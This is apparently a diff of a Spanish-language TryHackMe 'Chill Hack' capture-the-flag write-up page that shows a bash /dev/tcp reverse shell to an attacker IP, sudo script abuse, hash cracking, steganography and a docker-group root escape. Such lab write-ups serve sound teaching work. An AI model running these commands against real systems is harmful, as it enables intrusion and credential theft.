/writeups/tryhackme/chill-hack/images/3_hu7187e35a56387e3b3c800356f0a3e02c_7879_d6d7a85ad8c19b07f04d1fdd197cbe95.webp 800w, /writeups/tryhackme/chill-hack/images/3_hu7187e35a56387e3b3c800356f0a3e02c_7879_3402c4db4a9f59a7ec7772afa6cc9ddb.webp 1024w" fetchpriority=low height=900 id=h-rh-i-4 src=/writeups/tryhackme/chill-hack/images/3_hu7187e35a56387e3b3c800356f0a3e02c_7879_2d9a3e6a86e6f44646086dece0f173f9.webp width=1600></p><p>Otra opción sería poner &ldquo;\&rdquo; antes del comando, porejemplo <strong>\ls</strong></p><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/tryhackme/chill-hack/images/5_hu70372f2fed536d491522b3e8702587be_4744_f6c6048ce07ba16e2be8a4e2525fcc2d.webp 480w, /writeups/tryhackme/chill-hack/images/5_hu70372f2fed536d491522b3e8702587be_4744_f0af5e9019686752b9e2826c8b0b4b12.webp 640w, /writeups/tryhackme/chill-hack/images/5_hu70372f2fed536d491522b3e8702587be_4744_91c6acb8ccbe45214b2b9b8720c40fcd.webp 800w, /writeups/tryhackme/chill-hack/images/5_hu70372f2fed536d491522b3e8702587be_4744_778284a4413d4d349652652f9c559e8e.webp 1024w" fetchpriority=low height=900 id=h-rh-i-5 src=/writeups/tryhackme/chill-hack/images/5_hu70372f2fed536d491522b3e8702587be_4744_1d10f871f360e2e378c374bce9b8e0dc.webp width=1600></p><p>Ahora lo que vamos a hacer es mandarnos una reverse shell desde la máquina víctima a la nuestra.</p><p>Lo primero va a ser ponerse en escucha por el puerto 443 con nc</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -nlvp <span class=m>443</span>
+</span></span></code></pre></div><p>Y después vamos a mandar desde la web el siguiente comando:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>#                           Puerto</span>
+</span></span><span class=line><span class=cl>pwd<span class=p>;</span>bash -c <span class=s2>&#34;bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1&#34;</span>
+</span></span><span class=line><span class=cl><span class=c1>#                 IP Atacante</span>
+</span></span></code></pre></div><p>Recibimos la reverse shell!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ nc -nlvp <span class=m>443</span>
+</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>443</span> ...
+</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.2.28.215<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.11.182<span class=o>]</span> <span class=m>57032</span>
+</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>1022<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
+</span></span><span class=line><span class=cl>bash: no job control in this shell
+</span></span><span class=line><span class=cl>www-data@ubuntu:/var/www/html/secret$ 
+</span></span></code></pre></div><p>Con un <strong>ip a</strong> podemos comprobar que estamos en la 10.10.11.182</p><pre tabindex=0><code>www-data@ubuntu:/var/www/html/secret$ ip a
 ip a
 1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
@@ -1086,19 +120,13 @@ ip a
        valid_lft 3363sec preferred_lft 3363sec
     inet6 fe80::36:f5ff:fe10:cb37/64 scope link 
        valid_lft forever preferred_lft forever
-</code></pre><h2 id="tratamiento-de-la-tty">Tratamiento de la tty<a href="#tratamiento-de-la-tty" class="anchor" aria-hidden="true">#</a> </h2>
-<p>Antes de nada para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">script /dev/null -c bash
-</span></span></code></pre></div><p>ctrl + z</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">reset
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">xterm
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">SHELL</span><span class="o">=</span>bash
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
-</span></span></code></pre></div><h2 id="escalada-de-privilegios">Escalada de privilegios<a href="#escalada-de-privilegios" class="anchor" aria-hidden="true">#</a> </h2>
-<h3 id="apaar">Apaar<a href="#apaar" class="anchor" aria-hidden="true">#</a> </h3>
-<p>Con un <strong>sudo -l</strong> vemos que podemos ejecutar el archivo <code>.helpline.sh</code> que está en el <code>/home/apaar/</code> como apaar</p>
-<pre tabindex="0"><code>www-data@ubuntu:/var/www/html/secret$ sudo -l
+</code></pre><h2 id=tratamiento-de-la-tty>Tratamiento de la tty<a href=#tratamiento-de-la-tty class=anchor aria-hidden=true>#</a></h2><p>Antes de nada para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>script /dev/null -c bash
+</span></span></code></pre></div><p>ctrl + z</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>stty raw -echo<span class=p>;</span> <span class=nb>fg</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>reset
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>xterm
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>export</span> <span class=nv>SHELL</span><span class=o>=</span>bash
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
+</span></span></code></pre></div><h2 id=escalada-de-privilegios>Escalada de privilegios<a href=#escalada-de-privilegios class=anchor aria-hidden=true>#</a></h2><h3 id=apaar>Apaar<a href=#apaar class=anchor aria-hidden=true>#</a></h3><p>Con un <strong>sudo -l</strong> vemos que podemos ejecutar el archivo <code>.helpline.sh</code> que está en el <code>/home/apaar/</code> como apaar</p><pre tabindex=0><code>www-data@ubuntu:/var/www/html/secret$ sudo -l
 Matching Defaults entries for www-data on ubuntu:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -1106,8 +134,7 @@ Matching Defaults entries for www-data on ubuntu:
 User www-data may run the following commands on ubuntu:
     (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
 www-data@ubuntu:/var/www/html/secret$ 
-</code></pre><p>Antes de nada vamos a ver el contenido del ese archivo</p>
-<pre tabindex="0"><code>#!/bin/bash
+</code></pre><p>Antes de nada vamos a ver el contenido del ese archivo</p><pre tabindex=0><code>#!/bin/bash
 
 echo
 echo &#34;Welcome to helpdesk. Feel free to talk to anyone at any time!&#34;
@@ -1120,8 +147,7 @@ read -p &#34;Hello user! I am $person,  Please enter your message: &#34; msg
 $msg 2&gt;/dev/null
 
 echo &#34;Thank you for your precious time!&#34;
-</code></pre><p>Es un programa muy simple, en el segundo input guarda la respuesta en una variable llamada <strong>msg</strong> y la ejecuta&hellip;</p>
-<pre tabindex="0"><code>www-data@ubuntu:/var/www/html/secret$ sudo -u apaar /home/apaar/.helpline.sh
+</code></pre><p>Es un programa muy simple, en el segundo input guarda la respuesta en una variable llamada <strong>msg</strong> y la ejecuta&mldr;</p><pre tabindex=0><code>www-data@ubuntu:/var/www/html/secret$ sudo -u apaar /home/apaar/.helpline.sh
 
 Welcome to helpdesk. Feel free to talk to anyone at any time!
 
@@ -1129,37 +155,22 @@ Enter the person whom you want to talk with: test
 Hello user! I am test,  Please enter your message: bash
 whoami
 apaar
-</code></pre><p>Para que nos salga el prompt y nos funcione el ctrl + l, etc&hellip; podemos poner el siguiente comando</p>
-<pre tabindex="0"><code>script /dev/null -c bash
-</code></pre><h3 id="anurodh">Anurodh<a href="#anurodh" class="anchor" aria-hidden="true">#</a> </h3>
-<h4 id="mysql-rabbit-hole">mysql (rabbit hole)<a href="#mysql-rabbit-hole" class="anchor" aria-hidden="true">#</a> </h4>
-<p>Para la escalada vamos a usar la herramienta https://linpeas.sh/ que es un script que automatiza el proceso de la escalada de privilegios</p>
-<p>Primero nos lo pasamos a nuestra máquina</p>
-<p>Después nos montamos un servidor con python por el puerto 80</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo python3 -m http.server <span class="m">80</span>
-</span></span></code></pre></div><p>Desde la máquina víctima en el directorio <strong>/tmp</strong> nos pasamos el archivo.</p>
-<pre tabindex="0"><code>wget http://10.10.10.10/linpeas.sh
-</code></pre><p>Le damos permisos de ejecución con chmod</p>
-<pre tabindex="0"><code>chmod +x linpeas.sh
-</code></pre><p>Y lo ejecutamos <strong>./linpeas.sh</strong></p>
-<p>Reporta que hay 2 puertos que solo son visibles desde el localhost</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:9001          0.0.0.0:*               LISTEN             
-</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:3306          0.0.0.0:*               LISTEN
-</span></span></code></pre></div><p>Esto lo podríamos haber encontrado tambíen con:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">apaar@ubuntu:/tmp$ <span class="o">(</span>netstat -punta <span class="o">||</span> ss --ntpu<span class="o">)</span> <span class="p">|</span> grep <span class="s2">&#34;127.0&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="o">(</span>No info could be <span class="nb">read</span> <span class="k">for</span> <span class="s2">&#34;-p&#34;</span>: geteuid<span class="o">()=</span><span class="m">1001</span> but you should be root.<span class="o">)</span>
-</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:9001          0.0.0.0:*               LISTEN      -                   
-</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
-</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
-</span></span><span class="line"><span class="cl">udp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.53:53           0.0.0.0:*                           -  
-</span></span></code></pre></div><p>El puerto <strong>3306</strong> es el puerto predeterminado de mysql</p>
-<p>Dentro del directorio <code>/var/www/files</code> hay un archivo llamado <code>index.php</code> en el cual hay unas credenciales para mysql</p>
-<p>Las cuales podemos usar para conectarnos</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">apaar@ubuntu:/var/www/files$ mysql -u root -p
-</span></span><span class="line"><span class="cl">Enter password: 
-</span></span><span class="line"><span class="cl">mysql&gt;
-</span></span></code></pre></div><p>Primero listamos las bases de datos</p>
-<pre tabindex="0"><code>mysql&gt; show databases;
+</code></pre><p>Para que nos salga el prompt y nos funcione el ctrl + l, etc&mldr; podemos poner el siguiente comando</p><pre tabindex=0><code>script /dev/null -c bash
+</code></pre><h3 id=anurodh>Anurodh<a href=#anurodh class=anchor aria-hidden=true>#</a></h3><h4 id=mysql-rabbit-hole>mysql (rabbit hole)<a href=#mysql-rabbit-hole class=anchor aria-hidden=true>#</a></h4><p>Para la escalada vamos a usar la herramienta https://linpeas.sh/ que es un script que automatiza el proceso de la escalada de privilegios</p><p>Primero nos lo pasamos a nuestra máquina</p><p>Después nos montamos un servidor con python por el puerto 80</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo python3 -m http.server <span class=m>80</span>
+</span></span></code></pre></div><p>Desde la máquina víctima en el directorio <strong>/tmp</strong> nos pasamos el archivo.</p><pre tabindex=0><code>wget http://10.10.10.10/linpeas.sh
+</code></pre><p>Le damos permisos de ejecución con chmod</p><pre tabindex=0><code>chmod +x linpeas.sh
+</code></pre><p>Y lo ejecutamos <strong>./linpeas.sh</strong></p><p>Reporta que hay 2 puertos que solo son visibles desde el localhost</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 127.0.0.1:9001          0.0.0.0:*               LISTEN             
+</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 127.0.0.1:3306          0.0.0.0:*               LISTEN
+</span></span></code></pre></div><p>Esto lo podríamos haber encontrado tambíen con:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>apaar@ubuntu:/tmp$ <span class=o>(</span>netstat -punta <span class=o>||</span> ss --ntpu<span class=o>)</span> <span class=p>|</span> grep <span class=s2>&#34;127.0&#34;</span>
+</span></span><span class=line><span class=cl><span class=o>(</span>No info could be <span class=nb>read</span> <span class=k>for</span> <span class=s2>&#34;-p&#34;</span>: geteuid<span class=o>()=</span><span class=m>1001</span> but you should be root.<span class=o>)</span>
+</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 127.0.0.1:9001          0.0.0.0:*               LISTEN      -                   
+</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+</span></span><span class=line><span class=cl>tcp        <span class=m>0</span>      <span class=m>0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+</span></span><span class=line><span class=cl>udp        <span class=m>0</span>      <span class=m>0</span> 127.0.0.53:53           0.0.0.0:*                           -  
+</span></span></code></pre></div><p>El puerto <strong>3306</strong> es el puerto predeterminado de mysql</p><p>Dentro del directorio <code>/var/www/files</code> hay un archivo llamado <code>index.php</code> en el cual hay unas credenciales para mysql</p><p>Las cuales podemos usar para conectarnos</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>apaar@ubuntu:/var/www/files$ mysql -u root -p
+</span></span><span class=line><span class=cl>Enter password: 
+</span></span><span class=line><span class=cl>mysql&gt;
+</span></span></code></pre></div><p>Primero listamos las bases de datos</p><pre tabindex=0><code>mysql&gt; show databases;
 +--------------------+
 | Database           |
 +--------------------+
@@ -1170,16 +181,14 @@ apaar
 | webportal          |
 +--------------------+
 5 rows in set (0.00 sec)
-</code></pre><p>Después listamos las tablas de la base de datos <strong>webportal</strong></p>
-<pre tabindex="0"><code>mysql&gt; show tables from webportal;
+</code></pre><p>Después listamos las tablas de la base de datos <strong>webportal</strong></p><pre tabindex=0><code>mysql&gt; show tables from webportal;
 +---------------------+
 | Tables_in_webportal |
 +---------------------+
 | users               |
 +---------------------+
 1 row in set (0.00 sec)
-</code></pre><p>Por último vemos el contenido de la tabla</p>
-<pre tabindex="0"><code>mysql&gt; use webportal
+</code></pre><p>Por último vemos el contenido de la tabla</p><pre tabindex=0><code>mysql&gt; use webportal
 mysql&gt; select * from users;
 +----+-----------+----------+-----------+----------------------------------+
 | id | firstname | lastname | username  | password                         |
@@ -1188,140 +197,25 @@ mysql&gt; select * from users;
 |  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
 +----+-----------+----------+-----------+----------------------------------+
 2 rows in set (0.00 sec)
-</code></pre><p>Podemos ver que está el hash de dos usuarios</p>
-<p>Con hash-identifier buscamos que tipo es</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ hash-identifier 7e53614ced3640d5de23f111806cc4fd
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Possible Hashs:
-</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> MD5
-</span></span></code></pre></div><p>Vamos a guardar cada uno en un archivo (hash1, hash2) y usando john con el diccionario rockyou vamos a intentar encontrar la contraseña</p>
-<pre tabindex="0"><code>john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash1
+</code></pre><p>Podemos ver que está el hash de dos usuarios</p><p>Con hash-identifier buscamos que tipo es</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ hash-identifier 7e53614ced3640d5de23f111806cc4fd
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Possible Hashs:
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> MD5
+</span></span></code></pre></div><p>Vamos a guardar cada uno en un archivo (hash1, hash2) y usando john con el diccionario rockyou vamos a intentar encontrar la contraseña</p><pre tabindex=0><code>john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash1
 
 john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash2
-</code></pre><p>Parece que era una trampa porque no sirven para nada :)</p>
-<h4 id="steganography">Steganography<a href="#steganography" class="anchor" aria-hidden="true">#</a> </h4>
-<p>Dentro del directorio <code>/var/www/files</code> hay un archivo llamado <code>hacker.php</code> el cual llama la atención</p>
-<p>Dentro del hacker.php:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src </span><span class="o">=</span> <span class="s">&#34;images/hacker-with-laptop_23-2147985341.jpg&#34;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;background-color:red;&#34;</span><span class="p">&gt;</span>You have reached this far. <span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;background-color:black;&#34;</span><span class="p">&gt;</span>Look in the dark! You will find your answer<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
-</span></span></code></pre></div><p>Hay un mensaje que dice: Has llegado muy lejos, Mira en la oscuridad y econtraras la respuesta</p>
-<p>Arriba del mensaje hay una foto, la cual puede ser que tenga algo</p>
-<p>Para pasarla a nuestra máquina vamos a abrirnos un servidor con python desde la máquina víctima</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -m http.server
-</span></span></code></pre></div><p>Y desde nuestra máquina nos la bajamos</p>
-<pre tabindex="0"><code>wget http://10.10.11.182:8000/hacker-with-laptop_23-2147985341.jpg
-</code></pre><p>Para ver si tiene algo oculto vamos a usar la herramienta steghide</p>
-<pre tabindex="0"><code>steghide extract -sf hacker-with-laptop_23-2147985341.jpg
-</code></pre><p>La imagen contenia un <code>backup.zip</code></p>
-<p>El backup.zip está protegido con una contraseña, lo que vamos a hacer es sacarle el hash y después intentar romperlo con john mediante el diccionario <code>rockyou.txt</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">zip2john backup.zip &gt; <span class="nb">hash</span>
-</span></span><span class="line"><span class="cl">john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nb">hash</span>
-</span></span><span class="line"><span class="cl">john --show <span class="nb">hash</span>
-</span></span></code></pre></div><p>Ahora ya tenmos la contraseña y lo podemos descomprimir.</p>
-<p>Dentro hay un php en el cual en una línea podemos ver que hay una condición con un base64</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$password</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&#34;IWQwbnRLbjB3bVlwQHNzdzByZA==&#34;</span><span class="p">)</span>
-</span></span></code></pre></div><p>Podemos descifrarlo con:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;IWQwbnRLbjB3bVlwQHNzdzByZA==&#34;</span> <span class="p">|</span> base64 -d
-</span></span></code></pre></div><p>El resultado es la contraseña del usuario <strong>anurodh</strong></p>
-<h3 id="root">Root<a href="#root" class="anchor" aria-hidden="true">#</a> </h3>
-<p>Al hacer un id vemos que pertenecemos al grupo de docker</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">anurodh@ubuntu:/var/www/files/images$ id 
-</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>anurodh<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>anurodh<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>anurodh<span class="o">)</span>,999<span class="o">(</span>docker<span class="o">)</span>
-</span></span></code></pre></div><p>Echando un ojo al gtfobins podemos ver que hay un comando para escalar privilegios con docker</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">docker run -v /:/mnt --rm -it alpine chroot /mnt sh
-</span></span></code></pre></div><p>Ya somos root :)</p>
-
-			<div class="page-footer-meta d-flex flex-column flex-md-row justify-content-between">
-				</div>
-			<div class="page-nav d-flex flex-column flex-sm-row">
-	
-	<div class="card w-100">
-			<div class="card-body d-flex">
-				<div class="d-flex flex-column justify-content-center">
-					<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-left" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-						<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
-						<path d="M5 12l14 0"></path>
-						<path d="M5 12l6 6"></path>
-						<path d="M5 12l6 -6"></path>
-				 	</svg>
-				</div>
-				<div class="d-flex flex-column">
-					<div class="text-body-secondary">Prev</div>
-					<a href="/writeups/hackmyvm/jabita/" class="stretched-link text-reset text-decoration-none">Jabita</a>
-				</div>
-			</div>
-		</div>
-	<div class="m-2"></div>
-	<div class="card text-end w-100">
-			<div class="card-body d-flex justify-content-end">
-				<div class="d-flex flex-column">
-					<div class="text-body-secondary">Next</div>
-					<a href="/writeups/tryhackme/team/" class="stretched-link text-reset text-decoration-none">Team</a>
-				</div>
-				<div class="d-flex flex-column justify-content-center">
-					<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-right" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-						<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
-						<path d="M5 12l14 0"></path>
-						<path d="M13 18l6 -6"></path>
-						<path d="M13 6l6 6"></path>
-					</svg>
-				</div>
-			</div>
-		</div>
-	</div>
-
-			
-		</main>
-		
-	</div>
-
-      
-      </div>
-    </div>
-    
-    
-    <footer class="footer text-muted">
-  <div class="container-lg">
-    <div class="row">
-      <div class="col-lg-8 text-center text-lg-start">
-        <ul class="list-inline">
-          <li class="list-inline-item"><a class="text-muted" href="/privacy/">Privacy Policy</a></li>
-        </ul>
-      </div>
-      <div class="col-lg-8 text-center text-lg-end">
-        <ul class="list-inline">
-          <li class="list-inline-item">Brought to you by <a class="text-muted" href="https://gethyas.com/">Hyas</a></li>
-        </ul>
-      </div>
-    </div>
-  </div>
-</footer>
-
-    
-
-<script async
-  src="/js/app.1e84dcdaa5ccef6fe83f6d88ac1e444a1f237111cfa2a7a97427f758e9c27ef4.js"
-  integrity="sha256-HoTc2qXM72/oP22IrB5ESh8jcRHPoqepdCf3WOnCfvQ=">
-</script>
-
-
-
-
-
-<script async
-  src="/js/flexsearch.78e4b7a9456a2770bd6faffb1f6488b30db12ca157c3df4e89e3ae2e258888ae.js"
-  integrity="sha256-eOS3qUVqJ3C9b6/7H2SIsw2xLKFXw99OieOuLiWIiK4=">
-</script>
-<script async
-  src="/js/search-modal.c4c023efcdee308e4b5f1110afe1db6b1656f217e67aa7efe54e2f4bf2feccf8.js"
-  integrity="sha256-xMAj783uMI5LXxEQr&#43;HbaxZW8hfmeqfv5U4vS/L&#43;zPg=">
-</script>
-
-    <div class="d-inline-flex fixed-bottom-right pb-4 pe-4">
-  <button id="toTop" type="button" class="btn btn-primary rounded-circle ms-auto p-2"><span class="visually-hidden">Top</span><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-up" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"></path><path d="M6 15l6 -6l6 6"></path></svg></button>
-</div>
-
-    
-  </body>
-</html>
+</code></pre><p>Parece que era una trampa porque no sirven para nada :)</p><h4 id=steganography>Steganography<a href=#steganography class=anchor aria-hidden=true>#</a></h4><p>Dentro del directorio <code>/var/www/files</code> hay un archivo llamado <code>hacker.php</code> el cual llama la atención</p><p>Dentro del hacker.php:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>img</span> <span class=na>src </span><span class=o>=</span> <span class=s>&#34;images/hacker-with-laptop_23-2147985341.jpg&#34;</span><span class=p>&gt;&lt;</span><span class=nt>br</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>h1</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;background-color:red;&#34;</span><span class=p>&gt;</span>You have reached this far. <span class=p>&lt;/</span><span class=nt>h2</span><span class=p>&gt;</span>
+</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>h1</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;background-color:black;&#34;</span><span class=p>&gt;</span>Look in the dark! You will find your answer<span class=p>&lt;/</span><span class=nt>h1</span><span class=p>&gt;</span>
+</span></span></code></pre></div><p>Hay un mensaje que dice: Has llegado muy lejos, Mira en la oscuridad y econtraras la respuesta</p><p>Arriba del mensaje hay una foto, la cual puede ser que tenga algo</p><p>Para pasarla a nuestra máquina vamos a abrirnos un servidor con python desde la máquina víctima</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 -m http.server
+</span></span></code></pre></div><p>Y desde nuestra máquina nos la bajamos</p><pre tabindex=0><code>wget http://10.10.11.182:8000/hacker-with-laptop_23-2147985341.jpg
+</code></pre><p>Para ver si tiene algo oculto vamos a usar la herramienta steghide</p><pre tabindex=0><code>steghide extract -sf hacker-with-laptop_23-2147985341.jpg
+</code></pre><p>La imagen contenia un <code>backup.zip</code></p><p>El backup.zip está protegido con una contraseña, lo que vamos a hacer es sacarle el hash y después intentar romperlo con john mediante el diccionario <code>rockyou.txt</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>zip2john backup.zip &gt; <span class=nb>hash</span>
+</span></span><span class=line><span class=cl>john --wordlist<span class=o>=</span>/usr/share/wordlists/rockyou.txt <span class=nb>hash</span>
+</span></span><span class=line><span class=cl>john --show <span class=nb>hash</span>
+</span></span></code></pre></div><p>Ahora ya tenmos la contraseña y lo podemos descomprimir.</p><p>Dentro hay un php en el cual en una línea podemos ver que hay una condición con un base64</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>base64_encode</span><span class=p>(</span><span class=nv>$password</span><span class=p>)</span> <span class=o>==</span> <span class=s2>&#34;IWQwbnRLbjB3bVlwQHNzdzByZA==&#34;</span><span class=p>)</span>
+</span></span></code></pre></div><p>Podemos descifrarlo con:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;IWQwbnRLbjB3bVlwQHNzdzByZA==&#34;</span> <span class=p>|</span> base64 -d
+</span></span></code></pre></div><p>El resultado es la contraseña del usuario <strong>anurodh</strong></p><h3 id=root>Root<a href=#root class=anchor aria-hidden=true>#</a></h3><p>Al hacer un id vemos que pertenecemos al grupo de docker</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>anurodh@ubuntu:/var/www/files/images$ id 
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1002<span class=o>(</span>anurodh<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1002<span class=o>(</span>anurodh<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1002<span class=o>(</span>anurodh<span class=o>)</span>,999<span class=o>(</span>docker<span class=o>)</span>
